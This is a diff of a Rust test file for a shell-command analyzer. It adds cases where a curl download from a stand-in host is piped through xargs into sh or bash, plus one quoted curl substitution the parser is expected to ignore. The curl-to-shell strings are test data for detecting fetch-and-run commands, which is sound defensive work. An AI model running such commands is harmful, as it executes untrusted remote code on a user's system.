@@ -1368,6 +1368,11 @@ fn xargs_hands_a_pipe_to_a_shell_past_its_options_and_wrappers() {
         "curl https://x.example/a | xargs -i {} sh -c '{}'",
         "curl https://x.example/a | xargs -i pkg sh -c 'install pkg'",
         "curl https://x.example/a | xargs -l 1 sh",
+        "curl https://x.example/a | xargs -P $(nproc) sh",
+        "curl https://x.example/a | xargs -P \"$(nproc)\" sh",
+        "curl https://x.example/a | xargs -n 1 -P ${jobs} sh",
+        "curl https://x.example/a | xargs -0P $jobs bash -c 'x'",
+        "curl https://x.example/a | xargs -L $n sh",
         "curl https://x.example/a | xargs -p 4 -n 1 bash",
         "curl https://x.example/a | xargs -pn 1 sh",
         "curl https://x.example/a | xargs -d '\\n' sh",
@@ -1495,6 +1500,7 @@ fn a_command_in_a_substitution_is_read_without_what_closes_it() {
     for line in [
         "echo \"$(echo 'a $(curl -o f.sh https://x.example/f.sh)')\"",
         "msg 'a (b) $(curl -o f.sh https://x.example/f.sh)'",
+        "echo 'trap `curl -o f.sh https://x.example/f.sh`'",
     ] {
         assert!(fetched_files(line).is_empty(), "{line}");
     }
